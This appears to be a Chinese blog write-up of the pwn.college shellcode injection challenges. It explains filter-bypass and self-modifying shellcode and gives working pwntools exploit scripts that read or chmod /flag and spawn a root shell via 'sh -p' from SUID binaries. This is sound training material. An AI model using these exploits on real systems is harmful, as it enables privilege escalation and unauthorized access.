---
title: pwn.college shellcode injection
date: 2023-10-27 15:13:53
tags:
  - shellcode
categories:
  - pwn
description: pwn.college shellcode injection总结与题解
password: shellshock
---

简单总结下从pwn.college shellcode injection里学到和巩固的一些知识。

# Slides

## Introduction

调试shellcode就是写汇编，pwn.college给了很方便的编译方式：

```shell
gcc -nostdlib -static shellcode.s -o shellcode-elf
./shellcode-elf
```

需要注意的是gcc默认链接脚本用符号`_start`作为程序入口，所以写shellcode时需要显式地定义符号`_start`并且作为程序的开头使用。之前在[简书](https://www.jianshu.com/p/a0aa881f43e0)上简单记录过用nasm编译之后链接的方法，但这两者对于调试简单的shellcode还是太麻烦。万能的pwntools也考虑到了这一场景，因此只需要一个简单的函数就能极为便利的调试shellcode，即`debug_shellcode`。简单翻了下pwntools源码，`debug_shellcode`调试汇编也需要先编译为可执行文件，工具链用的是binutil即`as`汇编`ld`链接的方式。需要注意的是shellcode默认情况下都会分配在读写权限为rwx的内存中，编译时需要指定shellcode section的读写权限，参考[gnu官方文档](https://ftp.gnu.org/old-gnu/Manuals/gas-2.9.1/html_chapter/as_7.html#SEC119)，即：

```shell
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
.intel_syntax noprefix
nop
# The optional flags argument is a quoted string which may contain any combintion of the following characters:

# a
# section is allocatable
# w
# section is writable
# x
# section is executable
```

`awx`即可分配可写可执行，对于shellcode的调试和执行是必要的，具体构建过程可以把pwntools log_level调至debug查看。顺便一提，同样的问题扔给GPT只会让你去改链接脚本。

当然还有一种方式就是用C手写一个shellcode加载器，不过也不会耗费太多时间：

```C
# include <sys/mman.h>

char shellcode[] = "{shellcode}";

int main() {{ 
    mprotect((void *)((int)shellcode & ~4095), 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    (*(int (*)())shellcode)();
    return 0;
}}
```

或者用mmap去分配一段读写权限为rwx的内存。至此shellcode的构建和调试过程已经完成。

## Common Challenges

这一节总结了shellcode中会遇到的各种过滤方式，大部分情况下直接过滤特殊字符，包括Null byte(0x00 -- scanf)、Newline(0x0a -- scanf, gets, getline, fgets)、Carriage return(0x0d)、Space(0x20 -- scanf)、Tab(0x09 -- scanf)、DEL(0x7F -- protocol like telnet)等。pwntools的shellcraft已经实现了一些基本特殊字符的绕过即0x00和0x0a，但实际的CTF中恶俗的出题壬会用更恶心的过滤方式，比如只能用Printable、Alphanumeric甚至0-9、A-Z极小的字节集合去写shellcode，这种时候可以用自动化的shellcode编码工具比如Alpha3，AE64去生成。

这样的工具用到的技巧只有几种，基本思路就是去做self-modify，即自修改，从而使用那些被过滤的字符，举一个最简单的例子`inc BYTE PTR [rip]`。self-modify的第一步就是需要先知道shellcode在内存中的位置，不管是相对寄存器的偏移还是在内存中的绝对地址，如果不知道shellcode的位置那么self-modify就无从下手，这一步也被称作GetPC。GetPC可以用一些技巧去拿到eip/rip寄存器的值，比如`call + pop`指令的组合，在x64中甚至可以`lea rax, [rip]`。能获取自身地址的shellcode是位置无关即PIC的，放在任意一段rwx的内存中都能运行，但在CTF中通常会显式地给出shellcode的起始地址，因为GetPC过程无法完全用Alphanumeric或Printable的字符集完成。

得到shellcode起始地址后自修改就相对容易做了，这一步可以完全在Alphanumeric或Printable的字符集范围内完成，pwnable.kr的ascii等经典题目就是用这样的方式去写shellcode。之前自己用x86写过一个工具但只做了Printable字符集合上的编码，后续会考虑扩写到更广泛的应用场景。

这一节还提到一些可能出现的干扰因素，比如shellcode被截断，排序，或者stdout和stderr都被关闭的情况，这需要结合具体场景作出应对，例如关闭stdout和stderr时可通过建立socket做IO。

## Data Execution Prevention

这一节主要聊了聊shellcode使用的必要条件，即shellcode必须布局在权限为rwx的内存中才能使用。达成这一目的主要方式主要有两种办法，其一是de-protecting memory，改变控制流使程序调用mprotect之类的系统调用改变内存的读写权限，这一方法要结合实际场景用ROP等方式完成。另一种是大部分解释型语言都会用的技巧，JIT，Just In Time Compilation，从效率的角度出发解释型语言的虚拟机需要尽可能快的将代码加载入内存并执行，因此分配内存会直接用rwx的权限，或者出于安全的考量交替分配rw/rx的权限，但不管是哪种只要重定向至预先写入的shellcode就可以利用。JIT的使用场景很广，浏览器，Java都会使用，V8 pwn等离不开JIT特性的利用。

# Challenges

## level1

签到，没做任何限制，pwn.college环境中二进制文件是读写权限都是rws即具有SUID权限，运行时能获得root权限，但real UID还是用户，所以直接写`execve("/bin/sh", NULL, NULL)`是行不通的，有三种解决方案：第一种是经典的ORW，第二种就是调chmod改flag的读写权限，第三种则是`sh -p`，`sh`关于这个option的说明极为隐蔽：

```
-p  Turned on whenever the real and effective user ids do not match.
    Disables processing of the $ENV file and importing of shell
    functions.  Turning this option off causes the effective uid and
    gid to be set to the real uid and gid.
```

如此`sh -p`运行的shell虽然real id仍是user但保留了root权限，这可能在提权中是一个经典的技巧。三种方式的exp如下：

```python
from pwn import *
from glob import glob

context.log_level = "debug"
context.arch = "amd64"
binary = glob("/challenge/*")[0] if ".c" in glob("/challenge/*")[1] else glob("/challenge/*")[1]
r = process(binary)

r.recvuntil(b"stack at ")
stack = int(r.recvline()[2:-2].decode(),16)
success("address: "+ hex(stack))
code = asm(shellcraft.open("/flag"))
code += asm(shellcraft.read("rax", stack+0x400,60))
code += asm(shellcraft.write(1, stack+0x400, 60))
# solution 1: open, read and write

code = asm(shellcraft.chmod("/flag", 0o777))
# solution 2: chmod of flag

shellcode = asm(shellcraft.execve("/bin/sh", ["sh", "-p"], 0))
# solution 3: sh -p

r.send(shellcode)
r.interactive()
```

## level2

level2加了随机截断，只需要增加0x800个`nop`即可。

## level3

level3过滤了零字节，但我们甚至不需要解决这个问题，因为pwntools的shellcraft构造模板已经绕过了`0x0`和`0xa`字节的限制。

## level4

level4算是能学到比较重要的东西，这里的check过滤了`H`字符，在`rappel`调试发现大部分字长为8字节的寄存器的操作都会使用`H`字符，但不包括`push`和`pop`指令。这里有两种方式绕过，第一种是把QWORD push到栈上，然后对栈上的数据做异或、加法等操作还原为我们想要的数据，例如`xor DWORD PTR [rsp + 4], 0x12345678`。第二种方式是用寄存器`r8`-`r15`赋值，因为这些寄存器的操作不会使用`H`字符，之后通过`push r8; pop rdi`等方式传参即可。

## level5

level5过滤了系统调用指令，这时就需要我们前面所说的self-modify的技巧去绕过了，注意题目用的是C capstone做指令的解析，如果数据不能被逆向为指令反汇编就会中断，所以我们需要选用完整的指令，然后在self-modify过程中将其修改为system call，这里给一个我的例子：

```python
from pwn import *
from glob import glob

context.log_level = "debug"
context.arch = "amd64"
binary = glob("/challenge/*")[0] if ".c" in glob("/challenge/*")[1] else glob("/challenge/*")[1]
r = process(binary)

r.recvuntil(b"shellcode at ")
addr = int(r.recvline()[2:-2].decode(),16)
success("address: "+ hex(addr))
code = """
/* open("/flag") */
xor BYTE PTR [rip + 22], 0x34
mov rax, 0x67616c662f
push rax
mov rdi, rsp
xor esi, esi
xor edx, edx
push 0x2
pop rax
rdtsc
/* read(rax, addr+0x500, 0x100) */
xor BYTE PTR [rip + 19], 0x34
push rax
pop rdi
mov rsi, {addr}
push 0x100
pop rdx
push 0x0
pop rax
rdtsc
/* write(1, addr+0x500, 0x100) */
xor BYTE PTR [rip + 20], 0x34
push 1
pop rdi
mov rsi, {addr}
push 0x100
pop rdx
push 0x1
pop rax
rdtsc
""".format(addr=hex(addr+0x500))
r.send(asm(code))
r.interactive()
```

## level6

在level5基础上加0x1000个`nop`即可。

## level7

调chmod即可，但实际题目大概率需要去调socket并连接的那一套。

## level8

chmod软链接是可以作用于文件本体的，所以我们不需要传`/flag`进内存中，只需要建立简单的软链接`f`再chmod：

```python
code = """
push 0x66 
// 'f'
push rsp
pop rdi
push 0x5A 
// SYS_chmod
pop rax
push 0x4
// 0o004
pop rsi
syscall
"""
```

## level9

每隔10字节吞一次shellcode，所以在吞之前做一次near jump：

```python
code = asm("""
push 0x66 
// 'f'
push rsp
pop rdi
push 0x5A 
// SYS_chmod
pop rax
nop
""") + b"\xeb\x0a" + b"\xcc"*10 + asm("""
push 0x4 
// 0o004
pop rsi
syscall
""")
```

## level10-11

乍一看很吓人，但实际上只对shellcode相当短的一部分做排序，level8的shellcode直接用就行。

## level12

每个字节都不同，所以不再用push pop传所有参数，xor能满足这一要求：

```python
code = """
push 0x66 
// 'f'
push rsp
pop rdi
xor al, 0x5A 
// SYS_chmod
xor sil, 0x4
// 0o004
syscall
"""
```

## level13

天下武功唯快不破，直接用level8的就行。

## level14

需要用一些前置条件，比如`rax`为0，即read的系统调用号，以及`rdx`指向shellcode的起始位置。

```python
from pwn import *
from glob import glob

context.log_level = "debug"
context.arch = "amd64"
binary = glob("/challenge/*")[0] if ".c" in glob("/challenge/*")[1] else glob("/challenge/*")[1]
r = process(binary)

r.recvuntil(b"shellcode at ")
code = """
xor edi, edi
push rdx
pop rsi
syscall
"""
r.send(asm(code))
shellcode = asm(shellcraft.execve("/bin/sh", ["sh", "-p"], 0))
r.send(b"\x90"*6 + shellcode)
r.interactive()
```

# Reference

1. https://www.freebuf.com/articles/database/321327.html
2. https://www.buryia.top/2022/01/06/Learn/CTF/dojo_pwn_college/dojo.pwn.college%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95(Shellcode%20Injection)/
3. https://hurricane618.me/2022/05/26/pwn-college-writeup-one/#module4-shellcode%E6%A8%A1%E5%9D%97
4. https://ftp.gnu.org/old-gnu/Manuals/gas-2.9.1/html_chapter/as_7.html#SEC119
5. https://fortenf.org/e/ctfs/pwn/2018/05/07/plaidctf-2018-waitwait.html